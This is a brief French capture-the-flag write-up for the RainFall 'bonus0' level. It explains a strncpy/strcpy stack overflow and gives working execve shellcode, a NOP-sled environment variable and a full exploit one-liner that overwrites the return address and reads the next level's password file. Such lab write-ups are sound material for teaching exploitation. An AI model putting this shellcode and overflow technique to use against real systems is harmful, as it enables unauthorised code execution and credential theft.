# BONUS0

La fonction `pp()`, fait deux appels à la fonction `p()` qui lit 4096 caractère sur stdin, puis fait un `strncpy(dest, string_read, 20)`.
On ne peut donc écrire que 20 caractères par appels à la fonction `p()`.
La fonction `pp()` va ensuite faire un strcpy de la premiere chaine.


short shellcode (25)
```
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```
bonus0@RainFall:~$ env -i shellcode=$(python -c 'print("\x90" *100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')  gdb bonus0

```

0xbfffffa0


( python -c 'print("A" * 20)' ; python -c 'print("B" * 9 + "\xc5\xff\xff\xbf" + "B" * 7)' ; echo 'cat /home/user/bonus1/.pass' ) | env -i shellcode=$(python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./bonus0



